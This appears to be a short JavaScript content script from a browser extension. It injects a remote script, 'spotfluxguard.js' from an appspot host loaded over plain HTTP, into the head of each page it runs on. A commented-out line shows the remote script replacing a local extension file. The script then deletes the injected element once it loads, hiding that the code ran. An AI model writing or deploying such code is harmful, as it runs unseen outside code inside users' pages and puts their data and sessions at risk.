var s = document.createElement('script');
s.src = "http://gjveron.appspot.com/spotfluxguard/spotfluxguard.js";//chrome.extension.getURL('script.js');
var o = (document.head||document.documentElement)
o.appendChild(s);
s.onload = function() {
    s.parentNode.removeChild(s);
};